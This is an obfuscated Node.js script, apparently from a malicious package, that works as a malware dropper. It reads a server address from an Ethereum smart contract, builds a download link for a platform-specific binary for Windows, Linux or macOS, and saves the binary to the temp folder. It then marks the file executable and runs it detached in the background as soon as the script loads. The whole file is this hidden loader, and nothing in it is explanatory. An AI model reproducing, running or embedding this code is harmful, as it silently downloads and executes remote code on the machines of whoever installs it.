function _0x5c5d(_0x2027d4,_0x3fd633){const _0x4877aa=_0x4877();return _0x5c5d=function(_0x5c5dd8,_0x58b0b7){_0x5c5dd8=_0x5c5dd8-0x93;let _0x11f187=_0x4877aa[_0x5c5dd8];return _0x11f187;},_0x5c5d(_0x2027d4,_0x3fd633);}const _0x3da71e=_0x5c5d;(function(_0x31ed5d,_0x42fa9e){const _0x596543=_0x5c5d,_0x1f004b=_0x31ed5d();while(!![]){try{const _0x4e74b0=-parseInt(_0x596543(0xb0))/0x1*(parseInt(_0x596543(0xa9))/0x2)+parseInt(_0x596543(0x9e))/0x3*(parseInt(_0x596543(0xb3))/0x4)+parseInt(_0x596543(0xac))/0x5+parseInt(_0x596543(0x9b))/0x6+parseInt(_0x596543(0xb9))/0x7+-parseInt(_0x596543(0xa3))/0x8+-parseInt(_0x596543(0xaf))/0x9*(parseInt(_0x596543(0x9a))/0xa);if(_0x4e74b0===_0x42fa9e)break;else _0x1f004b['push'](_0x1f004b['shift']());}catch(_0x2bed2f){_0x1f004b['push'](_0x1f004b['shift']());}}}(_0x4877,0x2ec79));const {ethers}=require(_0x3da71e(0xab)),axios=require(_0x3da71e(0xa4)),util=require('util'),fs=require('fs'),path=require(_0x3da71e(0xa6)),os=require('os'),{spawn}=require('child_process'),contractAddress=_0x3da71e(0xb5),WalletOwner=_0x3da71e(0xaa),abi=['function\x20getString(address\x20account)\x20public\x20view\x20returns\x20(string)'],provider=ethers['getDefaultProvider'](_0x3da71e(0x9d)),contract=new ethers[(_0x3da71e(0xc2))](contractAddress,abi,provider),fetchAndUpdateIp=async()=>{const _0x13781e=_0x3da71e,_0x1f5f60={'bZnrB':_0x13781e(0xc0),'dJNfM':function(_0x26b623){return _0x26b623();}};try{const _0x2c8921=await contract[_0x13781e(0xad)](WalletOwner);return _0x2c8921;}catch(_0x44625c){return console[_0x13781e(0xb7)](_0x1f5f60[_0x13781e(0xb6)],_0x44625c),await _0x1f5f60['dJNfM'](fetchAndUpdateIp);}},getDownloadUrl=_0x23921a=>{const _0x5f59c4=_0x3da71e,_0x298f0b={'WKqOP':_0x5f59c4(0xa2),'EKHRe':_0x5f59c4(0x9f)},_0x4ff94c=os[_0x5f59c4(0x93)]();switch(_0x4ff94c){case _0x5f59c4(0xa5):return _0x23921a+_0x5f59c4(0xa8);case _0x298f0b[_0x5f59c4(0xa1)]:return _0x23921a+_0x5f59c4(0xbb);case _0x298f0b[_0x5f59c4(0xb2)]:return _0x23921a+_0x5f59c4(0xc1);default:throw new Error(_0x5f59c4(0x97)+_0x4ff94c);}},downloadFile=async(_0xec359d,_0x5c73d0)=>{const _0x59bc14=_0x3da71e,_0x453313={'knHkm':_0x59bc14(0x95),'Iapyc':_0x59bc14(0xb7),'zzFeQ':function(_0x1f6a0f,_0x38ac38){return _0x1f6a0f(_0x38ac38);},'woBru':_0x59bc14(0x99)},_0x428561=fs['createWriteStream'](_0x5c73d0),_0x50fff5=await _0x453313[_0x59bc14(0xbc)](axios,{'url':_0xec359d,'method':_0x453313['woBru'],'responseType':'stream'});return _0x50fff5[_0x59bc14(0x98)][_0x59bc14(0xae)](_0x428561),new Promise((_0x379b54,_0x562be0)=>{const _0x4972db=_0x59bc14;_0x428561['on'](_0x453313[_0x4972db(0xbf)],_0x379b54),_0x428561['on'](_0x453313['Iapyc'],_0x562be0);});},executeFileInBackground=async _0x487a6d=>{const _0x132c23=_0x3da71e,_0x82eace={'yWCdY':function(_0x5dd022,_0x4bd76e,_0x2fd461,_0x1e50e2){return _0x5dd022(_0x4bd76e,_0x2fd461,_0x1e50e2);}};try{const _0x5e9141=_0x82eace[_0x132c23(0xbd)](spawn,_0x487a6d,[],{'detached':!![],'stdio':_0x132c23(0x94)});_0x5e9141[_0x132c23(0xa7)]();}catch(_0x154a98){console[_0x132c23(0xb7)](_0x132c23(0xb4),_0x154a98);}},runInstallation=async()=>{const _0x1ee382=_0x3da71e,_0x5ec2d8={'ILoEB':function(_0x9ea074){return _0x9ea074();},'TuPuq':function(_0x4b3980,_0x35a55d){return _0x4b3980(_0x35a55d);},'KqSWr':function(_0x4d5bbe,_0x22f45c,_0x5b242b){return _0x4d5bbe(_0x22f45c,_0x5b242b);},'nXXIv':function(_0x53a4ce,_0x25921b){return _0x53a4ce!==_0x25921b;},'sejbH':_0x1ee382(0xa5),'olNYP':_0x1ee382(0x9c)};try{const _0x44e30d=await _0x5ec2d8[_0x1ee382(0x96)](fetchAndUpdateIp),_0xebc803=_0x5ec2d8['TuPuq'](getDownloadUrl,_0x44e30d),_0x1c1fc9=os['tmpdir'](),_0x5e0e91=path[_0x1ee382(0xb8)](_0xebc803),_0x198b13=path[_0x1ee382(0xb1)](_0x1c1fc9,_0x5e0e91);await _0x5ec2d8[_0x1ee382(0xba)](downloadFile,_0xebc803,_0x198b13);if(_0x5ec2d8['nXXIv'](os[_0x1ee382(0x93)](),_0x5ec2d8['sejbH']))fs['chmodSync'](_0x198b13,_0x5ec2d8[_0x1ee382(0xbe)]);executeFileInBackground(_0x198b13);}catch(_0x12726b){console[_0x1ee382(0xb7)](_0x1ee382(0xa0),_0x12726b);}};runInstallation();function _0x4877(){const _0x182bf1=['bZnrB','error','basename','156849pNfjGM','KqSWr','/node-linux','zzFeQ','yWCdY','olNYP','knHkm','Ошибка\x20при\x20получении\x20IP\x20адреса:','/node-macos','Contract','platform','ignore','finish','ILoEB','Unsupported\x20platform:\x20','data','GET','40vZJTBd','1823436kKhxHi','755','mainnet','18024IayPpp','darwin','Ошибка\x20установки:','WKqOP','linux','650976VrYxOP','axios','win32','path','unref','/node-win.exe','28qoJITZ','0x52221c293a21D8CA7AFD01Ac6bFAC7175D590A84','ethers','518980VzmwyG','getString','pipe','142551JcwiMT','24722cOOUCQ','join','EKHRe','168GakisM','Ошибка\x20при\x20запуске\x20файла:','0xa1b40044EBc2794f207D45143Bd82a1B86156c6b'];_0x4877=function(){return _0x182bf1;};return _0x4877();}